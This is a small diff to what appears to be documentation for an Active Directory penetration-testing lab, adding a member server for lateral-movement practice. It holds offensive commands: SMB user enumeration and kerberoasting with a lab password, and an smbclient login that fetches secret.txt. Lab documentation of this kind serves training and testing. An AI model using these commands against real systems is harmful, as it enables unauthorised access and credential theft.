@@ -470,6 +470,10 @@ nxc smb $IP -u alice -p 'Spring2024!' --users
 impacket-GetUserSPNs -dc-ip $IP LAB.LOCAL/alice:'Spring2024!' -request   # kerberoast
 ```
 Users: alice, bob, jdoe, svc_sql(SPN), svc_web(SPN), asrepuser. Attack cmds: `cheat ad`.
+Includes a domain-joined **member server** (172.30.0.20) for lateral movement:
+```bash
+smbclient //172.30.0.20/data -U 'LAB\alice%Spring2024!' -c 'ls; get secret.txt'
+```
 
 ### `adlab`
 Guide for setting up an Active Directory lab (GOAD / Ludus — VM-based, not Docker).
